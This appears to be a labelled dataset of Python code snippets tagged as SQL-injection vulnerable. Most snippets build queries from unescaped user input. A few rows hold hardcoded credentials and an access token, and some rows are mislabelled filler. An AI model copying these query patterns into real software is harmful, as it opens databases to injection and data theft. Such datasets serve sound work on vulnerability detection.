"                feature_dict[""classes""] = utils.get_equal_interval_bins(data_table, boundary_table, stat_field, pg_cur, settings)                feature_array.append(feature_dict)            i += 1        output_dict[""stats""] = feature_array        output_array.append(output_dict)        print(""Got metadata for {0} in {1}"".format(boundary_name, datetime.now() - start_time))    response_dict[""boundaries""] = output_array",vulns_sql
    decimal_places = utils.get_decimal_places(zoom_level),vulns_sql
"    stat_table_name = boundary_name + ""_"" + table_id    boundary_table_name = ""{0}"".format(boundary_name)        envelope_sql = ""ST_MakeEnvelope({0}, {1}, {2}, {3}, 4283)"".format(map_left, map_bottom, map_right, map_top)        geom_sql = ""geojson_{0}"".format(display_zoom)        sql = ""SELECT bdy.id, bdy.name, bdy.population, tab.{0} / bdy.area AS density, "" \              ""CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END AS percent, "" \              ""tab.{0}, {1} AS geometry "" \              ""FROM {2}.{3} AS bdy "" \              ""INNER JOIN {4}.{5} AS tab ON bdy.id = tab.{6} "" \              ""WHERE bdy.geom && {7}"" \            .format(stat_id, geom_sql, settings['web_schema'], boundary_table_name, settings['data_schema'],                    stat_table_name, settings['region_id_field'], envelope_sql)            pg_cur.execute(sql)",vulns_sql
"def get_kmeans_bins(data_table, boundary_table, stat_field, pg_cur, settings):    sql = ""WITH sub AS ("" \          ""WITH points AS ("" \          ""SELECT {0} as val, ST_MakePoint({0}, 0) AS pnt FROM {1} AS tab "" \          ""INNER JOIN {2} AS bdy ON tab.{3} = bdy.id) "" \          ""SELECT val, ST_ClusterKMeans(pnt, {4}) OVER () AS cluster_id FROM points) "" \          ""SELECT MAX(val) AS val FROM sub GROUP BY cluster_id ORDER BY val"" \        .format(stat_field, data_table, boundary_table, settings['region_id_field'], settings['num_classes'])    print(sql)    try:        pg_cur.execute(sql)        rows = pg_cur.fetchall()    except Exception as ex:        print(""{0} - {1} Failed: {2}"".format(data_table, stat_field, ex))        return list()    output_list = list()    for row in rows:        output_list.append(row[""val""])    return output_list    sql = ""SELECT MIN({0}) AS min, MAX({0}) AS max FROM {1}  AS tab "" \          ""INNER JOIN {2} AS bdy ON tab.{3} = bdy.id "" \          ""WHERE {0} > 0 AND {0} < 100.0""\        .format(stat_field, data_table, boundary_table, settings['region_id_field'])        pg_cur.execute(sql)",vulns_sql
"          ""ELSE 'normalised' END AS maptype "" \",vulns_sql
"            return ""I can't SELECT :\n\n"" + sql",vulns_sql
"              ""WHERE bdy.geom && ST_MakeEnvelope(%s, %s, %s, %s, 4283) LIMIT ALL"" \            return ""I can't SELECT : "" + sql",vulns_sql
    state_name = session.query(State).filter(State.name.contains(argv[4])),vulns_sql
"        table = conn.execute(f""select * from populated where lower(name) = '{search}'"")            table = conn.execute(f""select * from systems where lower(name) = '{search}'"")",vulns_sql
"        query = f""select * from stations where lower(name) = '{search}'""            table = conn.execute(f""select id from populated where lower(name)='{target_system}'"")                query += f"" and system_id = {target_system}""        result = conn.execute(query)",vulns_sql
"        result = conn.execute(f""select * from bodies where lower(name) = '{search}'"")",vulns_sql
"            table = conn.execute(f""select * from commodities where lower(name)='{search[0]}'"")",vulns_sql
"            table = conn.execute(f""select id from commodities where lower(name)='{search[0]}'"")            query = f""select id from stations where lower(name)='{search[1]}'""                table = conn.execute(f""select id from systems where lower(name)='{search[2]}'"")                query += f"" and system_id={system_id}""            table = conn.execute(query)",vulns_sql
"            table = conn.execute(f""select * from listings where station_id={station_id} ""                                 f""and commodity_id={commodity_id}"")",vulns_sql
"        ""WHERE lower(barnivore_product_name) like lower('% \%s %')""        cur.execute(QUERY, (name))    except(psycopg2.DatabaseError, e):",vulns_sql
"    except(psycopg2.DatabaseError, e):",vulns_sql
"        ""UPDATE twitter_bot_vac_last_replied_id SET item_id = '${0}' WHERE name = '${1}'""",vulns_sql
"    except(psycopg2.DatabaseError, e):",vulns_sql
"        print(dm.sender_screen_name + "" sent "" + dm.text)",vulns_sql
"    c.execute('INSERT INTO players (player_name) VALUES (%s)', (name,))",vulns_sql
"             ""(SELECT total_matches FROM total_view WHERE total_view.player_id = players.player_id) """,vulns_sql
"              'VALUES (%s, %s)', (winner, loser,))",vulns_sql
"            cols = cols + "", %s""        nameList = []        nameList.append(tableName)            nameList.append(key)        nameList = nameList + valList            cursor.execute(""INSERT INTO %s (TIMESTAMP"" + cols + "") VALUES (%s,"" + vals + "")"", nameList)            print(""Insert Error: %s"".format(e))            if e == missing_column:                print(""Attempting to alter table!"")                columnName = """"                params = []                    t = self.__getType(tableObj[columnName]);                    params.append(tableName);                    params.append(columnkName);                    params.append(t);                    print(""Got a type error %s"".format(e))                    print('Error with field %s'.format(columnName))                    cursor.execute(""ALTER TABLE %s ADD COLUMN %s %s"", params)                    print(""Failed to alter table with error e"".format(e))                print(""Table alteration succeeded - attempting to insert again"")                    print('posted successfully!')            elif e == missing_table:                try:                    self.createTable(tableName, tableObj)                    print(""Created table successfully - reinserting"")                except psycopg2.Error as e:                    print(""Failed to create table??: %s"".format(e))                    raise                try:                    self.insertData(tableName, timeStamp, tableObj)                    print('posted successfully!')                except:                    print(""Unexpected error when reinserted!"")                    raise",vulns_sql
"            cols = cols + "", %s %s""        nameList = []        nameList.append(tableName)                nameList.append(key)                nameList.append(t)                print('Error with object %s at key %s with value %s'.format(tableObj, key, tableObj[key]))                print(""Caught error %s"".format(e))            cursor.execute(""CREATE TABLE %s (TIMESTAMP TIMESTAMPTZ NOT NULL"" + cols + "")"", nameList)            print(""CREATE TABLE Error: %s"".format(e))",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
	params = (email),vulns_sql
			tags.append(i),vulns_sql
"    query = db.query(""select * from page where title = '%s'"" % page_name).namedresult()",vulns_sql
"        query_history = db.query(""select * from page_history where page_id = '%s' order by version_number DESC;"" % query.id).namedresult()",vulns_sql
"    query = db.query(""select * from page where title = '%s'"" % page_name).namedresult()",vulns_sql
"        query = db.query(""select * from page where title = '%s'"" % page_name)",vulns_sql
"    page = db.query(""select title from page where title = '%s'"" % search).namedresult()",vulns_sql
"        self.cursor.execute(""update users set money = money - %s where id = %s""%(money, user_id))        self.cursor.execute(""update projects set money = money + %s where id = %s"" % (money, project_id))        self.cursor.execute(""insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )"" % (project_id, user_id, money))        self.cursor.execute(""insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )"" % (project_id, user_id, money))        self.cursor.execute(""SELECT count(id) FROM projects where id = %s"" % project_id)        self.cursor.execute(""SELECT count(id) FROM kickstarter.users where id = %s and money >= %s"" % (user_id, money))",vulns_sql
"        self.cursor.execute(""update users set money = money - %s where id = %s""%(money, user_id))        self.cursor.execute(""update projects set money = money + %s where id = %s"" % (money, project_id))        self.cursor.execute(""insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )"" % (project_id, user_id, money))        self.cursor.execute(""insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )"" % (project_id, user_id, money))        self.cursor.execute(""SELECT count(id) FROM projects where id = %s"" % project_id)        self.cursor.execute(""SELECT count(id) FROM kickstarter.users where id = %s and money >= %s"" % (user_id, money))",vulns_sql
"        self.cursor.execute(""update users set money = money - %s where id = %s""%(money, user_id))        self.cursor.execute(""update projects set money = money + %s where id = %s"" % (money, project_id))        self.cursor.execute(""insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )"" % (project_id, user_id, money))        self.cursor.execute(""insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )"" % (project_id, user_id, money))        self.cursor.execute(""SELECT count(id) FROM projects where id = %s"" % project_id)        self.cursor.execute(""SELECT count(id) FROM kickstarter.users where id = %s and money >= %s"" % (user_id, money))",vulns_sql
"        query = ""SELECT movie_id, rating FROM recommendationDB.user_ratings WHERE user_id="" + user        cur.execute(query)        text_file = open(""ratings.dat"", ""a"")        text_file.write(processedRow)    print hash_ids    hash = hashlib.sha1('.'.join(hash_ids)).hexdigest()    if cache != None:            svd.load_data(filename='./ratings.dat',",vulns_sql
"            query = ""SELECT movie_id, movie_title, movie_genre FROM recommendationDB.movies WHERE "" + films                         mimetype=""application/json"")",vulns_sql
"    query = db.query(""select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1"" % page_name)",vulns_sql
"    query = db.query(""select page_content.content from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1"" % page_name)",vulns_sql
"    query = db.query(""select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1"" % page_name)",vulns_sql
"    query = db.query(""select page_content.timestamp, page_content.id from page, page_content where page.id = page_content.page_id and page.page_name = '%s'"" % page_name)",vulns_sql
"    query = db.query(""select page_content.content, page_content.timestamp from page, page_content where page.id = page_content.page_id and page_content.id = '%s'"" % content_id)",vulns_sql
"    query = db.query(""select id from page where page_name = '%s'"" % page_name)",vulns_sql
"    return redirect(""/%s"" % page_name)    return redirect('/%s' % search)",vulns_sql
"            SET message = '{}'            WHERE client_id = '{}'        """""".format(new_message, logged_user.get_client_id())        cursor.execute(update_sql)            SET password = '{}'            WHERE client_id = '{}'        """""".format(new_pass, logged_user.get_client_id())        cursor.execute(update_sql)            VALUES ('{}', '{}')        """""".format(username, password)        cursor.execute(insert_sql)            WHERE username = '{}' AND password = '{}'        """""".format(username, password)        cursor.execute(select_query)",vulns_sql
"import bleach    return psycopg2.connect(""dbname=tournament"")    conn = connect()    c = conn.cursor()    c.execute(""delete from matches"")    conn.commit()    conn.close()    conn = connect()    c = conn.cursor()    c.execute(""delete from players"")    conn.commit()    conn.close()    conn = connect()    c = conn.cursor()    c.execute(""select count(*) from players"")    results = c.fetchone()    conn.close()    return int(results[0])",vulns_sql
"    name = bleach.clean(name)    conn = connect()    c = conn.cursor()    c.execute(""insert into players (name_player) values (%s)"",(name,))    conn.commit()    conn.close()",vulns_sql
"    conn = connect()    c = conn.cursor()    c.execute(""select * from ranking order by count_wins desc"")    results = c.fetchall()    conn.commit()    conn.close()    return results",vulns_sql
"    conn = connect()    c = conn.cursor()    c.execute(""insert into matches (winner, loser) values ({0},{1})"".format(winner, loser))    conn.commit()    conn.close()",vulns_sql
"    conn = connect()    c = conn.cursor()    c.execute(""select * from ranking order by count_wins desc"")    players_list = c.fetchall()    num_games = len(players_list)/2    result = []    for game in range(num_games):        first_player_index = game*2        second_player_index = first_player_index + 1        first_player_tuple = players_list[first_player_index]        second_player_tuple = players_list[second_player_index]        result.append((first_player_tuple[0], first_player_tuple[1], second_player_tuple[0], second_player_tuple[1]))    conn.close()    return result",vulns_sql
"                sql = 'insert into userInfo values(""' + username + '"", ""' + pass_hash + '"")'                c.execute(sql)",vulns_sql
"                sql = 'insert into userInfo values(""' + username + '"", ""' + pass_hash + '"")'                c.execute(sql)",vulns_sql
"                sql = 'insert into userInfo values(""' + username + '"", ""' + pass_hash + '"")'                c.execute(sql)",vulns_sql
"        self.cursor.execute(""SELECT url FROM queue WHERE visited = '0' LIMIT {};"".format(numberOfLinks))",vulns_sql
"            self.cursor.execute(""INSERT INTO queue (url, visited) VALUES ('{}', '0');"".format(url))",vulns_sql
"        sql = ""UPDATE queue SET visited='1' WHERE url = '{}';""            url = re.sub(""[\(\)\']"", """", line[0])            t = Thread(target=self.execute(sql.format(url)))",vulns_sql
"            widths.append(max(cd[2], len(cd[0])))",vulns_sql
"        print (""insert error: "", error)",vulns_sql
        print('Goodbye.'),vulns_sql
"        def create_junk_table(self):        def destroy_junk_table(self):                query = ""SELECT Pass FROM user WHERE Email = '"" + email +""'""                self.cursor.execute(query)                query = ""INSERT INTO `testdb`.`report` (`Report_ID`, `User_ID`, `Summary`, `Description`, `Votes`, `Is_Resolved`) VALUES ('"" + reportID + ""', '"" + userID + ""', '"" + summary + ""', '"" + description + ""', '0', '0')""                self.cursor.execute(query)                query1 = ""SELECT Votes FROM report WHERE Report_ID = '"" + reportID +""'""                self.cursor.execute(query1)                query2 = ""UPDATE `testdb`.`report` SET `Votes` = '"" + str(intVote) + ""' WHERE `report`.`Report_ID` = "" + reportID                self.cursor.execute(query2)                query1 = ""SELECT Votes FROM report WHERE Report_ID = '"" + reportID +""'""                self.cursor.execute(query1)                query = ""UPDATE `testdb`.`report` SET `Is_Resolved` = '1' WHERE `report`.`Report_ID` = "" + reportID                self.cursor.execute(query)                query = ""SELECT * FROM report WHERE Report_ID = "" + reportID                 self.cursor.execute(query)",vulns_sql
"                query = ""INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('"" + userID + ""', '"" + fName + ""', '"" + lName + ""', '"" + email +""', '"" + password2 + ""', '0')""                self.cursor.execute(query)                query = ""INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('"" + userID + ""', '"" + fName + ""', '"" + lName + ""', '"" + email +""', '"" + password2 + ""', '1')""                self.cursor.execute(query)dbc = DatabaseController('localhost', 3306, 'testuser', 'test623', 'testdb')dbc.create_basic_user(""1586390"", ""Daniel"", ""Gonzalez"", ""dgonz023@fiu.edu"", ""dpnet"")print(dbc.verify_account(""dgonz023@fiu.edu"", ""dpnet""))",vulns_sql
"    def get(self):        self.render(login.html)        self.set_secure_cookie(""username"", self.get_argument(""username""))#passed from html with the tag username",vulns_sql
"    ""cookie_secret"": os.urandom(24),     ""xsrf_cookies"": True}",vulns_sql
"            qs = ""select * from account_access where access_token = '%s'"" % self.access_token            result = self.db.get(qs)",vulns_sql
    access_token = '9920e647907355f3756dad8b1477da4bcc6850fe'    url = 'http://test.kan.sohu.com/api/2/sync/stream',vulns_sql
"VERSION_NUMBER = (1, 0, 10)",vulns_sql
"		command = ""ALTER TABLE "" + TABLE_NAME + "" ADD COLUMN "" + str(column) + "" "" + getSQLiteType(init_data)	def _run_command(self, command):",vulns_sql
			cursor = conn.execute(command),vulns_sql
"		command = ""SELECT ID FROM {0} WHERE path='{1}';"".format(TABLE_NAME,pth)		data = self._run_command(command)",vulns_sql
"			command = ""INSERT INTO {0} (type, path, mod_time) VALUES (0, '{1}', {2});"".format(TABLE_NAME, pth, mod_time)			self._run_command(command)",vulns_sql
"			command = ""SELECT mod_time FROM {0} WHERE path='{1}';"".format(TABLE_NAME, pth)			result = self._run_command(command)",vulns_sql
"			command = ""UPDATE {0} SET mod_time={1} WHERE path='{2}';"".format(TABLE_NAME, mod_time, pth)			self._run_command(command)",vulns_sql
"			command = ""INSERT INTO {0} (type, path, meta, mod_time) VALUES (1, '{1}', '{2}', '{3}');"".format(TABLE_NAME,																			pth,																			utils.SQLiteUtils.escapeText(metadata),																			mod_time																			)			self._run_command(command)",vulns_sql
"			command = ""UPDATE {0} SET meta='{1}', mod_time='{3}' WHERE path='{2}';"".format(TABLE_NAME,																		utils.SQLiteUtils.escapeText(metadata),																		pth,																		mod_time)			self._run_command(command)",vulns_sql
"			command = ""SELECT meta FROM {0} where path='{1}';"".format(TABLE_NAME, pth)			data = self._run_command(command)",vulns_sql
"		command = ""DELETE FROM {0} WHERE path='{1}';"".format(TABLE_NAME, pth)		self._run_command(command)",vulns_sql
"		command = ""UPDATE {0} SET file_id='{1}' WHERE path='{2}'"".format(TABLE_NAME, cacheID, pth)		self._run_command(command)",vulns_sql
"		command = ""SELECT file_id FROM {0} WHERE path='{1}'"".format(TABLE_NAME, pth)		data = self._run_command(command)",vulns_sql
"		command = ""UPDATE {0} SET file_id=NULL WHERE path='{1}'"".format(TABLE_NAME, pth)		self._run_command(command)",vulns_sql
"		command = ""SELECT meta FROM {0} WHERE path='{1}';"".format(TABLE_NAME,pth)		data = 	self._run_command(command)",vulns_sql
"def db_execute(sql, expect_return_values=False):",vulns_sql
"    return db_execute(sql, True)      keyword_string = ""(jdk_entries.title LIKE '%"" + keyword + ""%' OR "" + \        ""jdk_entries.body LIKE '%"" + keyword + ""%') ""      from_date_string = ""jdk_entries.date_last_modified >= '"" + from_date + ""' ""      to_date_string = ""jdk_entries.date_last_modified <= '"" + to_date + ""' """,vulns_sql
"    return db_execute(sql, True)      ""WHERE jdk_entries.id = "" + self.entry_id + "";""     self.title, self.body = db_execute(sql, True)[0] # returns array      ""VALUES ('', '', "" + CURRENT_DATESTAMP + \      "", "" + CURRENT_DATESTAMP + "");""    db_execute(sql)    self.entry_id = str(db_execute(sql, True)[0][0]);     ",vulns_sql
"    sql = ""UPDATE jdk_entries SET title = '"" + self.title + ""'"" + \          ""WHERE jdk_entries.id = '"" + self.entry_id + ""';""     db_execute(sql)      ""SET date_last_modified = "" + CURRENT_DATESTAMP + "" "" + \      ""WHERE jdk_entries.id = '"" + self.entry_id + ""';""    db_execute(sql)",vulns_sql
"      sql = ""UPDATE jdk_entries "" + \        ""SET body = '"" + self.body + ""' "" + \        ""WHERE jdk_entries.id = '"" + self.entry_id + ""';""      db_execute(sql)",vulns_sql
"    where job in ('%(job1)s', '%(job2)s')    where job = '%(job1)s'    where job = '%(job2)s'    where job = '%(job1)s') as j1    where job = '%(job2)s') as j2",vulns_sql
"    df = sql.frame_query(query %locals(), db)",vulns_sql
"    df = model.sql.frame_query(query, db)",vulns_sql
"						select_where = "" WHERE topic_id=%s ORDER BY post_id""			c.execute(select_statement, (topic_id,))",vulns_sql
"    return psycopg2.connect(""dbname=news"")",vulns_sql
"            ""LIMIT {0}"".format(amount)    c.execute(query)    rows = c.fetchall()    response = ""    Top {0} Articles by Views\n""  \",vulns_sql
"            ""cast(errorcount as decimal) / cast(hitcount as decimal) * 100 >= {0}"" \            .format(x)    c.execute(query)",vulns_sql
DB = connect()c = DB.cursor()reportTopArticles(3)reportTopAuthors()reportDailyErrors(1),vulns_sql
            limiting_str = int(args.split('limit/')[1])            limiting_str = default_limit        ordering_str = '',vulns_sql
"            ordering_str = ','.join(ordering_list)            ordering_str = 'm.name'        term_str = """"                term = str(term)                    term_str += ' type LIKE ""%' + term + '%""'                    term_str += ' format LIKE ""%' + term + '""%""'                        term_str += 'AND'                     term_str += '( t.name LIKE ""%' + term + '%""'                    term_str += ' OR m.name LIKE ""%' + term + '%""'                    term_str += ' OR m.note LIKE ""%' + term + '%"")'        if (len(term_str) > 0):            term_str = ' AND (' + term_str + ')'        """""" exclude the content of own mucua on the network        TODO: maybe create also an option for including or not the own mucua data """"""        if (mucua == 'rede'):            origin_str = ""origin_id!="" + str(this_mucua.id)        else:            origin_str = ""origin_id="" + str(mucua.id)        sql ='SELECT DISTINCT m.* FROM media_media m LEFT JOIN media_media_tags mt ON m.id = mt.media_id LEFT JOIN tag_tag t ON mt.tag_id = t.id  WHERE (%s AND repository_id = %d) %s ORDER BY %s LIMIT %s' % (origin_str, repository.id, term_str, ordering_str, limiting_str)        medias = Media.objects.raw(sql)",vulns_sql
        query = '''        WHERE driver = '{driver}'        '''.format(driver = driver)        self.cursor.execute(query),vulns_sql
"        query = ""SELECT COUNT(email) FROM members WHERE email = '{email}'"".format(email = member)        self.cursor.execute(query)",vulns_sql
"        query = ""SELECT COUNT(rno) FROM rides WHERE rno = {rno}"".format(rno = rno)        self.cursor.execute(query)",vulns_sql
        query = '''        WHERE driver = '{driver}'        '''.format(driver = driver)        self.cursor.execute(query),vulns_sql
"        query = ""SELECT COUNT(email) FROM members WHERE email = '{email}'"".format(email = member)        self.cursor.execute(query)",vulns_sql
"        query = ""SELECT COUNT(rno) FROM rides WHERE rno = {rno}"".format(rno = rno)        self.cursor.execute(query)",vulns_sql
        print (e),vulns_sql
        print (e),vulns_sql
        print (e),vulns_sql
"            query = ""INSERT INTO crimes(description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
"        c.execute(""INSERT INTO requests VALUES('""+dte+""','""+cladd+""','""+cmd+""','""+path+""','""+UserAgentString+""','""+rvers+""')"") # logging            c.execute(""INSERT INTO useragents VALUES(NULL,NULL,'""+UserAgentString+""')"") # trying to find all the new useragentstrings            RefID = c.execute(""SELECT RefID FROM useragents WHERE useragent='""+UserAgentString+""'"").fetchone() #get RefID if there is one - should be set in Backend                Resp = c.execute(""SELECT * FROM responses WHERE RID=""+str(RefID[0])+"""").fetchall()",vulns_sql
"        c.execute(""INSERT INTO requests VALUES('""+dte+""','""+cladd+""','""+cmd+""','""+path+""','""+UserAgentString+""','""+rvers+""')"")            c.execute(""INSERT INTO useragents VALUES(NULL,NULL,'""+UserAgentString+""')"")            RefID = c.execute(""SELECT RefID FROM useragents WHERE useragent='""+UserAgentString+""'"").fetchone()                Resp = c.execute(""SELECT * FROM responses WHERE RID=""+str(RefID[0])+"""").fetchall()",vulns_sql
"            RefID = c.execute(""SELECT ID FROM sites WHERE site='"" + site + ""'"").fetchone()            siteheaders = c.execute(""SELECT * FROM headers WHERE RID="" + str(RefID[0]) + """").fetchall()",vulns_sql
"        c.execute(""INSERT INTO posts VALUES(""                  ""NULL,'""+dte+""','""+cladd+""','""+cmd+""','""+path+""','""+UserAgentString+""','""+rvers+""',NULL,NULL)""                  )            c.execute(                ""INSERT INTO useragents VALUES""                    ""(NULL,NULL,'""+UserAgentString+""')""            )            RefID = c.execute(""SELECT RefID FROM useragents WHERE useragent='""+UserAgentString+""'"").fetchone()                Resp = c.execute(""SELECT * FROM responses WHERE RID=""+str(RefID[0])+"""").fetchall()",vulns_sql
"                        c.execute(                        ""INSERT INTO files VALUES(NULL,'"" +                            str(RefID[0]) + ""','"" +                            key + ""','"" +                            val[0] + ""')""                        )                    c.execute(""INSERT INTO posts VALUES(NULL,'"" +                              dte + ""','"" +                              cladd + ""','"" +                              cmd + ""','"" +                              path + ""','"" +                              UserAgentString + ""','"" +                              rvers + ""','"" +                              key + ""','"" +                              val[0] +""')""                              )",vulns_sql
"	def __init__(self, *args, **kwargs):		self.dbStr = ""../Databases/Product.db""",vulns_sql
"		c.execute(""SELECT * FROM {tn} WHERE {upc}={my_upc}"".\	        format(tn=self.table_name, cn=self.column_2, 	        	upc=self.column_2, my_upc=self.some_upc))",vulns_sql
"	def create_frame(self, F):		new_frame = SearchPage(self.container, self)		self.frames[SearchPage] = new_frame		new_frame.grid(row=0, column=0, sticky=""nsew"")		self.show_frame(new_frame)			def remove_frame(self, frame):				print(""remove_frame: "" + str(frame))		self.frames.pop(frame, None)",vulns_sql
"	def search(self):				upc = """"		upcEntry = self.UPC_Entry.get()		if(upcEntry == """"):			emptyInputLabel = tk.Label(self.statusbar, text=""UPC Cannot Be Empty"", fg=""red"")			emptyInputLabel.pack()		if(self.UPC_Entry.get() != """"):			self.View_Result_Button = tk.Button(self.navbar, text=""View Result"", 				font=self.controller.itemFont, command=lambda: self.controller.custom_frame())			self.View_Result_Button.pack(side=""left"", pady=10, padx=10)			upc = self.UPC_Entry.get()						result_not_found = tk.Label(self, text=""No Result Found!"", font=self.controller.itemFont)				result_not_found.pack()				self.View_Result_Button.config(state='disabled')				result_found_notification = tk.Label(self, text=""Results Found!"", font=self.controller.itemFont)				result_found_notification.pack()				self.View_Result_Button.config(state='normal')",vulns_sql
"		(ID, UPC, name, imageURI) = controller.get_result()		load = Image.open(imageURI)		render = ImageTk.PhotoImage(load)				img_label = tk.Label(self, image=render)		img_label.image = render		img_label.pack(side=""right"")		name_label = tk.Label(self, text=""Product: "" + name, font=controller.titleFont)		name_label.pack(pady=10, padx=10, anchor=""nw"")		upc_label = tk.Label(self, text=""UPC: "" + UPC, font=controller.itemFont)		upc_label.pack(pady=10, padx=10, anchor=""nw"")		new_search_button = tk.Button(self, text=""New Search"",			font=controller.itemFont, command=lambda: self.new_search())		new_search_button.pack(side=""left"", pady=10, padx=10, anchor=""sw"")		exit_app_button = tk.Button(self, text=""Quit"", 		exit_app_button.pack(side=""left"", pady=10, padx=10, anchor=""sw"")	def new_search(self):		self.controller.remove_frame(SearchPage)		new_frame = self.controller.create_frame(SearchPage)",vulns_sql
"    sql = args.sql % tuple(sql_arguments)    print 'Running :', sql    cursor.execute(sql)",vulns_sql
"    sql = args.sql % tuple(sql_arguments)    print 'Running :', sql    cursor.execute(sql)",vulns_sql
"        query = conn.execute(""INSERT INTO USERS(NAME, PASSWORD) VALUES ('""+Name+""', '""+Password+""')"");",vulns_sql
"    sql = 'SELECT * FROM message where user_id = %d ORDER BY c_time DESC' \        % (user_id)    cursor.execute(sql)        sql = 'SELECT nickname FROM users where user_id = %d' % user_id        cursor.execute(sql)        sql = ""SELECT * FROM like_msg where msg_id = %d AND user_id = %d"" \            % (message[0], user_id)        cursor.execute(sql)",vulns_sql
"                    user = u[0]                    sql = ""INSERT INTO users (user) VALUES ('%s')"" % (user)                    outcur.execute(sql)",vulns_sql
"                    sql = ""Select user from users where user = '%s';"" % user                    rsu = list(outcur.execute(sql))                        sql = ""INSERT INTO users (user) VALUES ('%s')"" % (user)                        outcur.execute(sql)",vulns_sql
"                        sql += ""VALUES ('%s','%s',%s)"" % (r[3],r[2],p)                                       outcur.execute(sql)",vulns_sql
"                            sql += ""VALUES ('%s','%s', %d,%s)"" % ("""", ip[1], -1,p)                             outcur.execute(sql)",vulns_sql
"                    sql += ""VALUES (%f, %f,'%s',%i,%i,%s)"" % (float(x),float(y),user,density,activity,p)                    outcur.execute(sql)",vulns_sql
"        sql = urlparams.to_sql()        data, column_names, error = datadb.execute_on_db_uniq(urlparams.db_uniq, sql)",vulns_sql
"                                        'IS', 'IS NOT', 'ISNOT', 'IN']:",vulns_sql
"                        next_2nd = next_2nd.upper()                    print next_arg                    print next_arg                    if next_arg == 'IN':                        self.filters.append((column, next_arg, '(' + next_2nd + ')'))                    else:                        self.filters.append((column, next_arg, next_2nd))",vulns_sql
"                sql += '{}{} {} {}'.format((' AND ' if i > 0 else ''), col_full_name, fop.upper(), fval)",vulns_sql
"                        order_bys.append('{} {}'.format(col, self.order_by_direction.upper()))                    sql += ' ORDER BY {} {}'.format(self.order_by_columns, self.order_by_direction.upper())        return sql",vulns_sql
"	db.execute(""SELECT * FROM players WHERE Name = '%s' COLLATE NOCASE"" % player)	db.execute(""UPDATE players SET ELO = %i, Played = %i, W = %i, L = %i WHERE Name = '%s' COLLATE NOCASE"" % (ELO, Played, W, L, Name))",vulns_sql
"	db.execute(""UPDATE players SET Judge = 1 WHERE Name = '%s' COLLATE NOCASE"" % (judge)) ",vulns_sql
"	db.execute(""UPDATE games set GamesPlayed = %i WHERE ID = %i"" % (Played, ID))	db.execute(""UPDATE games set Running = 'No' WHERE ID = %i"" % ID)	db.execute(""SELECT * FROM games WHERE ID = %i"" % ID)",vulns_sql
"    con = sqlite3.connect(""something.db"")    con.isolation_level = None    cur = con.cursor()    buffer = """"        if(i != arg_count):        elif(i == arg_count):            arg_string += (arg_values[i] + "");"")",vulns_sql
"        cr.execute('update project_task set active=True where project_id in %s', (tuple(ids,)))",vulns_sql
"        c.execute(""""""insert into fields values (%d, '%s', '%s', '-1', '%s', '%s', '-1', %d, %d, %d, %d, '-1', '-1', '-1')""""""%                (data['ID'], side, data['Name'], data['Name'], data['Signature'].replace('net/minecraft/src/',''),  data['Class'], int(data['Implemented']), data['Inherited'], data['Defined']))        c.execute(""""""insert into methods values (%d, '%s', '%s', '-1', '%s', '%s', '-1', %d, %d, %d, %d, '-1', '-1', '-1')""""""%                (data['ID'], side, data['Name'], data['Name'], data['Signature'].replace('net/minecraft/src/',''),  data['Class'], int(data['Implemented']), data['Inherited'], data['Defined']))",vulns_sql
"    c.execute(""""""UPDATE methods SET decoded  = '%s' WHERE name     = '%s' AND side = 'client'""""""%(method['full'], method['searge_c']))        c.execute(""""""UPDATE methods SET decoded  = '%s' WHERE name     = '%s' AND side = 'server'""""""%(method['full'], method['searge_s']))    c.execute(""""""UPDATE fields SET decoded = '%s' WHERE name = '%s' AND side = 'client'""""""%(field['full'], field['searge_c']))    c.execute(""""""UPDATE fields SET decoded = '%s' WHERE name = '%s' AND side = 'server'""""""%(field['full'], field['searge_s']))    ",vulns_sql
"    c.execute(""""""UPDATE methods SET name = '%s', notch = '%s', decoded = '%s' WHERE id=%d""""""%(row[1].split('/')[-1], row[2], row[1].split('/')[-1], row[0]))",vulns_sql
"            c.execute(""""""SELECT m.name, m.notch, m.decoded, m.signature, m.notchsig, c.name, c.notch             c.execute(""""""SELECT m.name, m.notch, m.decoded, m.signature, m.notchsig, c.name, c.notch ",vulns_sql
"        elif string == ""'"":            return ""!     .   .""",vulns_sql
"        query = ""SELECT * FROM {} WHERE {} = '{}' AND id != {}"".format(            self.table_name, key, self.escapedString(value),id)",vulns_sql
"    def update_find_by(self, key, value,id):        query=query.format(self.table_name, key, self.escapedString(value),id)",vulns_sql
"            WHERE TimeStamp BETWEEN %s AND %s         for row in self.c.execute(query % (day_start, day_end)):",vulns_sql
"                WHERE TimeStamp BETWEEN %s AND %s                GROUP BY TimeStamp                ''' % (day_start, day_end)        self.c.execute(query)",vulns_sql
"            WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s;        for row in self.c.execute(query % (day_start, day_end, inverter_serial)):                WHERE Serial = %s;                ''' % inverter_serial                WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s                ''' % (day_start, day_end, inverter_serial)        self.c.execute(query)",vulns_sql
            FROM ( SELECT TimeStamp FROM DayData WHERE Serial = %s );            ''' % inverter_serial        self.c.execute(query),vulns_sql
"            WHERE TimeStamp BETWEEN %s AND %s            GROUP BY TimeStamp        for row in self.c.execute(query % (month_start, month_end)):",vulns_sql
"            WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s        for row in self.c.execute(query % (month_start, month_end, inverter_serial)):",vulns_sql
